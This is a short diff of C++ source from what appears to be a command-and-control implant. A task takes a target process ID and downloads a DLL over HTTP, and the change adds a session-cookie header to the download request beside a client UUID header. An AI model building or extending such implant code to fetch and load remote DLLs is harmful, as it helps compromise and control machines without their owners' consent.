@@ -12,7 +12,9 @@ namespace Task
         DWORD dwPid = Utils::Convert::WstringToDWORD(wPid, 10);
 
         // Download DLL
-        std::wstring wHeaders = L"X-UUID: " + pState->wUUID + L"\r\n";
+        std::wstring wHeaders = L"";
+        wHeaders += L"X-UUID: " + pState->wUUID + L"\r\n";
+        wHeaders += L"Cookie: session_id=" + pState->wSessionID + L"\r\n";
         std::vector<BYTE> bytes = System::Http::DataDownload(
             pState->pProcs,
             pState->pCrypt,
